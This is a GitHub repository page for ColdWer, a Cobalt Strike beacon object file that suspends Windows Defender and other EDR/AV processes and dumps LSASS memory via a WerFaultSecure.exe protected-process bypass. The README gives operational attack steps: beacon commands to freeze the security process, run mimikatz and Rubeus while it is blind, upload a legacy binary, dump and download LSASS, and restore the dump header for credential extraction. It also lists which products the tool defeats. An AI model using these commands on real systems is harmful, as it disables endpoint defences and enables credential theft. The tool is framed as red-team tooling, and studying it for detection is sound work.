# https://github.com/0xsh3llf1r3/ColdWer

[Skip to content](https://github.com/0xsh3llf1r3/ColdWer#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/0xsh3llf1r3/ColdWer) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/0xsh3llf1r3/ColdWer) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/0xsh3llf1r3/ColdWer) to refresh your session.Dismiss alert

{{ message }}

[0xsh3llf1r3](https://github.com/0xsh3llf1r3)/ **[ColdWer](https://github.com/0xsh3llf1r3/ColdWer)** Public

- [Notifications](https://github.com/login?return_to=%2F0xsh3llf1r3%2FColdWer) You must be signed in to change notification settings
- [Fork\\
20](https://github.com/login?return_to=%2F0xsh3llf1r3%2FColdWer)
- [Star\\
112](https://github.com/login?return_to=%2F0xsh3llf1r3%2FColdWer)


Cobalt Strike BOF to freeze EDR/AV processes and dump LSASS using WerFaultSecure.exe PPL bypass


### License

[MIT license](https://github.com/0xsh3llf1r3/ColdWer/blob/main/LICENSE)

[112\\
stars](https://github.com/0xsh3llf1r3/ColdWer/stargazers) [20\\
forks](https://github.com/0xsh3llf1r3/ColdWer/forks) [Branches](https://github.com/0xsh3llf1r3/ColdWer/branches) [Tags](https://github.com/0xsh3llf1r3/ColdWer/tags) [Activity](https://github.com/0xsh3llf1r3/ColdWer/activity)

[Star](https://github.com/login?return_to=%2F0xsh3llf1r3%2FColdWer)

[Notifications](https://github.com/login?return_to=%2F0xsh3llf1r3%2FColdWer) You must be signed in to change notification settings

# 0xsh3llf1r3/ColdWer

main

[**1** Branch](https://github.com/0xsh3llf1r3/ColdWer/branches) [**0** Tags](https://github.com/0xsh3llf1r3/ColdWer/tags)

[Go to Branches page](https://github.com/0xsh3llf1r3/ColdWer/branches)[Go to Tags page](https://github.com/0xsh3llf1r3/ColdWer/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![sh3llf1r3](https://avatars.githubusercontent.com/u/68248103?v=4&size=40)](https://github.com/sh3llf1r3)[sh3llf1r3](https://github.com/0xsh3llf1r3/ColdWer/commits?author=sh3llf1r3)<br>[Initial release: ColdWer](https://github.com/0xsh3llf1r3/ColdWer/commit/792f5bf37b5e4e93d285ef090eaa34dcab3e224a)<br>3 weeks agoJan 29, 2026<br>[792f5bf](https://github.com/0xsh3llf1r3/ColdWer/commit/792f5bf37b5e4e93d285ef090eaa34dcab3e224a) · 3 weeks agoJan 29, 2026<br>## History<br>[1 Commit](https://github.com/0xsh3llf1r3/ColdWer/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/0xsh3llf1r3/ColdWer/commits/main/) 1 Commit |
| [bin](https://github.com/0xsh3llf1r3/ColdWer/tree/main/bin "bin") | [bin](https://github.com/0xsh3llf1r3/ColdWer/tree/main/bin "bin") | [Initial release: ColdWer](https://github.com/0xsh3llf1r3/ColdWer/commit/792f5bf37b5e4e93d285ef090eaa34dcab3e224a "Initial release: ColdWer") | 3 weeks agoJan 29, 2026 |
| [cw](https://github.com/0xsh3llf1r3/ColdWer/tree/main/cw "cw") | [cw](https://github.com/0xsh3llf1r3/ColdWer/tree/main/cw "cw") | [Initial release: ColdWer](https://github.com/0xsh3llf1r3/ColdWer/commit/792f5bf37b5e4e93d285ef090eaa34dcab3e224a "Initial release: ColdWer") | 3 weeks agoJan 29, 2026 |
| [src](https://github.com/0xsh3llf1r3/ColdWer/tree/main/src "src") | [src](https://github.com/0xsh3llf1r3/ColdWer/tree/main/src "src") | [Initial release: ColdWer](https://github.com/0xsh3llf1r3/ColdWer/commit/792f5bf37b5e4e93d285ef090eaa34dcab3e224a "Initial release: ColdWer") | 3 weeks agoJan 29, 2026 |
| [.gitignore](https://github.com/0xsh3llf1r3/ColdWer/blob/main/.gitignore ".gitignore") | [.gitignore](https://github.com/0xsh3llf1r3/ColdWer/blob/main/.gitignore ".gitignore") | [Initial release: ColdWer](https://github.com/0xsh3llf1r3/ColdWer/commit/792f5bf37b5e4e93d285ef090eaa34dcab3e224a "Initial release: ColdWer") | 3 weeks agoJan 29, 2026 |
| [LICENSE](https://github.com/0xsh3llf1r3/ColdWer/blob/main/LICENSE "LICENSE") | [LICENSE](https://github.com/0xsh3llf1r3/ColdWer/blob/main/LICENSE "LICENSE") | [Initial release: ColdWer](https://github.com/0xsh3llf1r3/ColdWer/commit/792f5bf37b5e4e93d285ef090eaa34dcab3e224a "Initial release: ColdWer") | 3 weeks agoJan 29, 2026 |
| [README.md](https://github.com/0xsh3llf1r3/ColdWer/blob/main/README.md "README.md") | [README.md](https://github.com/0xsh3llf1r3/ColdWer/blob/main/README.md "README.md") | [Initial release: ColdWer](https://github.com/0xsh3llf1r3/ColdWer/commit/792f5bf37b5e4e93d285ef090eaa34dcab3e224a "Initial release: ColdWer") | 3 weeks agoJan 29, 2026 |
| View all files |

## Repository files navigation

[![ColdWer](https://camo.githubusercontent.com/e96ef4b1bbb9ba8728c2636f34ba568214d97a5dd2a60c48a3d41291255b84da/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f436f6c645765722d424f462d626c75653f7374796c653d666f722d7468652d6261646765)](https://camo.githubusercontent.com/e96ef4b1bbb9ba8728c2636f34ba568214d97a5dd2a60c48a3d41291255b84da/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f436f6c645765722d424f462d626c75653f7374796c653d666f722d7468652d6261646765)

_A cold war on your endpoint._

[![Stars](https://camo.githubusercontent.com/49ad3a2d22607ecee3e0b0bf9077ee6116727f59784136e927cd9218420c74a6/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f30787368336c6c663172332f436f6c645765723f7374796c653d736f6369616c)](https://github.com/0xsh3llf1r3/ColdWer/stargazers)[![Forks](https://camo.githubusercontent.com/035cc8fbe17226c3ce00046d74823b2ad27d3080fe02325c1d756964cd657cb6/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f666f726b732f30787368336c6c663172332f436f6c645765723f7374796c653d736f6369616c)](https://github.com/0xsh3llf1r3/ColdWer/network/members)[![License](https://camo.githubusercontent.com/82e4b159811daa205781fd463defdacba90ba029641ee65ea2339a9925ffe841/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f30787368336c6c663172332f436f6c64576572)](https://github.com/0xsh3llf1r3/ColdWer/blob/main/LICENSE)

* * *

# 🥶 ColdWer

[Permalink: 🥶 ColdWer](https://github.com/0xsh3llf1r3/ColdWer#-coldwer)

**ColdWer** leverages WerFaultSecure.exe PPL bypass to freeze EDR/AV processes and dump LSASS memory on modern Windows systems.

```
C O L D W E R
        └─┴─┴── WerFaultSecure
    └─┴──────── LSASS Dump
└─┴──────────── Cold (Freeze)
```

> _Freeze your EDR/AV. Extract what you need. Stay cold._

* * *

## 👤 Author

[Permalink: 👤 Author](https://github.com/0xsh3llf1r3/ColdWer#-author)

**Sh3llf1r3** ( [@0xsh3llf1r3](https://github.com/0xsh3llf1r3))

* * *

## 🙏 Credits

[Permalink: 🙏 Credits](https://github.com/0xsh3llf1r3/ColdWer#-credits)

This project builds upon research by **TwoSevenOneT** ( [@TwoSevenOneT](https://x.com/TwoSevenOneT)):

| Project | Description |
| --- | --- |
| [EDR-Freeze](https://github.com/TwoSevenOneT/EDR-Freeze) | Original EDR freeze technique |
| [WSASS](https://github.com/TwoSevenOneT/WSASS) | LSASS dump via WerFaultSecure |

**All credit for the underlying techniques goes to TwoSevenOneT.**

* * *

## 🔥 Features

[Permalink: 🔥 Features](https://github.com/0xsh3llf1r3/ColdWer#-features)

| Feature | Description |
| --- | --- |
| ❄️ **Freeze** | Put EDR/AV processes into a coma state |
| 🔓 **Dump** | Extract LSASS memory bypassing PPL |
| 🛡️ **PPL Bypass** | Leverage WerFaultSecure.exe at WinTcb level |
| ⚡ **Fast** | Inline BOF execution |
| 🎯 **Manual Control** | You decide when to freeze and unfreeze |

* * *

## 🚀 Getting Started

[Permalink: 🚀 Getting Started](https://github.com/0xsh3llf1r3/ColdWer#-getting-started)

### 📋 Prerequisites

[Permalink: 📋 Prerequisites](https://github.com/0xsh3llf1r3/ColdWer#-prerequisites)

- Cobalt Strike 4.x
- High integrity beacon (Administrator/SYSTEM)

### 💾 Installation

[Permalink: 💾 Installation](https://github.com/0xsh3llf1r3/ColdWer#-installation)

1. Clone the repository:

```
git clone https://github.com/0xsh3llf1r3/ColdWer.git
```

2. Load the aggressor script in Cobalt Strike:

- Go to **Cobalt Strike → Script Manager**
- Click **Load**
- Select `cw/coldwer.cna`

### 📦 Building from Source

[Permalink: 📦 Building from Source](https://github.com/0xsh3llf1r3/ColdWer#-building-from-source)

```
# Navigate to source directory
cd src/

# Compile BOF (requires MinGW)
make

# Or manually:
x86_64-w64-mingw32-gcc -c coldwer.c -o ../cw/coldwer.o
```

### 📥 Quick Download

[Permalink: 📥 Quick Download](https://github.com/0xsh3llf1r3/ColdWer#-quick-download)

1. Go to [Releases](https://github.com/0xsh3llf1r3/ColdWer/releases)
2. Download `coldwer.o` and `coldwer.cna`
3. Place both in the same folder
4. Load `coldwer.cna` in Cobalt Strike

* * *

## 🖥️ Usage

[Permalink: 🖥️ Usage](https://github.com/0xsh3llf1r3/ColdWer#%EF%B8%8F-usage)

### ❄️ Freeze EDR/AV

[Permalink: ❄️ Freeze EDR/AV](https://github.com/0xsh3llf1r3/ColdWer#%EF%B8%8F-freeze-edrav)

```
# Find Windows Defender PID
beacon> ps

# Freeze the process
beacon> cw-freeze 1337

# Execute your commands while EDR/AV is frozen
beacon> mimikatz sekurlsa::logonpasswords
beacon> execute-assembly /tools/Rubeus.exe triage

# Unfreeze when done
beacon> cw-unfreeze
```

### 🔓 Dump LSASS

[Permalink: 🔓 Dump LSASS](https://github.com/0xsh3llf1r3/ColdWer#-dump-lsass)

```
# Step 1: Upload Win8.1 WerFaultSecure.exe
beacon> cd C:\Windows\Temp
beacon> upload /path/to/bin/wfs.exe

# Step 2: Find LSASS PID
beacon> ps

# Step 3: Dump LSASS
beacon> cw-dump 314 C:\Windows\Temp\wfs.exe

# Step 4: Download the dump
beacon> download C:\Windows\Temp\lsass.dmp
```

### 🔧 After Download

[Permalink: 🔧 After Download](https://github.com/0xsh3llf1r3/ColdWer#-after-download)

Change the file header to restore the minidump format:

| Original (PNG) | Change to (MDMP) |
| --- | --- |
| `89 50 4E 47` | `4D 44 4D 50` |

Restore Header Commands:

| Method | Command |
| --- | --- |
| Python | `open('lsass.dmp','r+b').write(b'MDMP')` |
| Bash | `printf '\x4d\x44\x4d\x50' | dd of=lsass.dmp bs=1 count=4 conv=notrunc` |
| PowerShell | `$f=[IO.File]::Open("lsass.dmp","Open","Write");$f.Write([byte[]](0x4D,0x44,0x4D,0x50),0,4);$f.Close()` |

Then parse with Mimikatz:

```
mimikatz# sekurlsa::minidump lsass.dmp
mimikatz# sekurlsa::logonpasswords
```

* * *

## 📋 Commands

[Permalink: 📋 Commands](https://github.com/0xsh3llf1r3/ColdWer#-commands)

| Command | Description |
| --- | --- |
| `cw-freeze <PID> [Path]` | Freeze process |
| `cw-unfreeze` | Unfreeze previously frozen process |
| `cw-dump <PID> <Path>` | Dump LSASS memory |

### 📝 Examples

[Permalink: 📝 Examples](https://github.com/0xsh3llf1r3/ColdWer#-examples)

```
# Freeze with default path
beacon> cw-freeze 1337

# Use custom WerFaultSecure.exe
beacon> cw-freeze 1337 C:\Windows\Temp\wfs.exe

# Dump LSASS
beacon> cw-dump 314 C:\Windows\Temp\wfs.exe

# Unfreeze when done
beacon> cw-unfreeze
```

* * *

## ✅ Supported Targets

[Permalink: ✅ Supported Targets](https://github.com/0xsh3llf1r3/ColdWer#-supported-targets)

| Target | Status |
| --- | --- |
| Windows Defender (MsMpEng.exe) | ✅ Works |
| LSASS (lsass.exe) | ✅ Works |
| Other PPL processes | ✅ Works |

* * *

## ⚠️ Limitations

[Permalink: ⚠️ Limitations](https://github.com/0xsh3llf1r3/ColdWer#%EF%B8%8F-limitations)

**Does NOT work against EDRs with kernel-mode self-protection:**

| EDR | Status |
| --- | --- |
| Elastic Endpoint | ❌ Blocked |
| CrowdStrike Falcon | ❌ Blocked |
| SentinelOne | ❌ Blocked |
| Carbon Black | ❌ Blocked |

* * *

## ⚙️ How It Works

[Permalink: ⚙️ How It Works](https://github.com/0xsh3llf1r3/ColdWer#%EF%B8%8F-how-it-works)

```
1. 🚀 Launch WerFaultSecure.exe as PPL (WinTcb level)
                    ↓
2. 🎯 WerFaultSecure attaches to target process
                    ↓
3. ⏸️  MiniDumpWriteDump suspends all target threads
                    ↓
4. 🥶 Suspend WerFaultSecure itself → Target stays frozen
                    ↓
5. ✅ Execute your commands (EDR/AV can't see!)
                    ↓
6. 🔥 Terminate WerFaultSecure → Target unfreezes
```

### 🔑 Why Win8.1 WerFaultSecure?

[Permalink: 🔑 Why Win8.1 WerFaultSecure?](https://github.com/0xsh3llf1r3/ColdWer#-why-win81-werfaultsecure)

| Version | Output |
| --- | --- |
| Windows 10/11 | Encrypted dump only |
| Windows 8.1 | **Raw unencrypted dump** |

* * *

## 🔍 Troubleshooting

[Permalink: 🔍 Troubleshooting](https://github.com/0xsh3llf1r3/ColdWer#-troubleshooting)

| Error | Cause | Solution |
| --- | --- | --- |
| File not found | Invalid path | Check WerFaultSecure.exe path |
| Access denied | Low privileges | Run as Administrator/SYSTEM |
| Invalid signature | Unsigned binary | Use properly signed WerFaultSecure.exe |
| Process does not exist | Wrong PID | Verify PID with ps command |
| Target protected | Kernel protection | EDR has self-protection (not bypassable) |
| Already frozen | State stuck | Run cw-unfreeze first |

* * *

## ⚖️ Disclaimer

[Permalink: ⚖️ Disclaimer](https://github.com/0xsh3llf1r3/ColdWer#%EF%B8%8F-disclaimer)

```
⚠️ FOR AUTHORIZED SECURITY TESTING ONLY

This tool is intended for:
- Authorized penetration testing
- Red team operations with written permission
- Security research in controlled environments

The author is not responsible for any misuse or damage caused by this tool.
Unauthorized access to computer systems is illegal.
```

* * *

## 📜 License

[Permalink: 📜 License](https://github.com/0xsh3llf1r3/ColdWer#-license)

MIT License - See [LICENSE](https://github.com/0xsh3llf1r3/ColdWer/blob/main/LICENSE)

* * *

**🥶 Stay Cold. Stay Quiet. 🥶**

⭐ Star this repo if you find it useful! ⭐

## About

Cobalt Strike BOF to freeze EDR/AV processes and dump LSASS using WerFaultSecure.exe PPL bypass


### Topics

[offensive-security](https://github.com/topics/offensive-security "Topic: offensive-security") [cobalt-strike](https://github.com/topics/cobalt-strike "Topic: cobalt-strike") [red-team](https://github.com/topics/red-team "Topic: red-team") [bof](https://github.com/topics/bof "Topic: bof") [av-bypass](https://github.com/topics/av-bypass "Topic: av-bypass") [windows-security](https://github.com/topics/windows-security "Topic: windows-security") [credential-dumping](https://github.com/topics/credential-dumping "Topic: credential-dumping") [edr-bypass](https://github.com/topics/edr-bypass "Topic: edr-bypass") [edr-evasion](https://github.com/topics/edr-evasion "Topic: edr-evasion") [beacon-object-file](https://github.com/topics/beacon-object-file "Topic: beacon-object-file") [lsass-dump](https://github.com/topics/lsass-dump "Topic: lsass-dump") [edr-freeze](https://github.com/topics/edr-freeze "Topic: edr-freeze") [ppl-bypass](https://github.com/topics/ppl-bypass "Topic: ppl-bypass")

### Resources

[Readme](https://github.com/0xsh3llf1r3/ColdWer#readme-ov-file)

### License

[MIT license](https://github.com/0xsh3llf1r3/ColdWer#MIT-1-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/0xsh3llf1r3/ColdWer).

[Activity](https://github.com/0xsh3llf1r3/ColdWer/activity)

### Stars

[**112**\\
stars](https://github.com/0xsh3llf1r3/ColdWer/stargazers)

### Watchers

[**0**\\
watching](https://github.com/0xsh3llf1r3/ColdWer/watchers)

### Forks

[**20**\\
forks](https://github.com/0xsh3llf1r3/ColdWer/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2F0xsh3llf1r3%2FColdWer&report=0xsh3llf1r3+%28user%29)

## [Releases](https://github.com/0xsh3llf1r3/ColdWer/releases)

No releases published

## [Packages\  0](https://github.com/users/0xsh3llf1r3/packages?repo_name=ColdWer)

No packages published

## Languages

- [C99.6%](https://github.com/0xsh3llf1r3/ColdWer/search?l=c)
- [Makefile0.4%](https://github.com/0xsh3llf1r3/ColdWer/search?l=makefile)

You can’t perform that action at this time.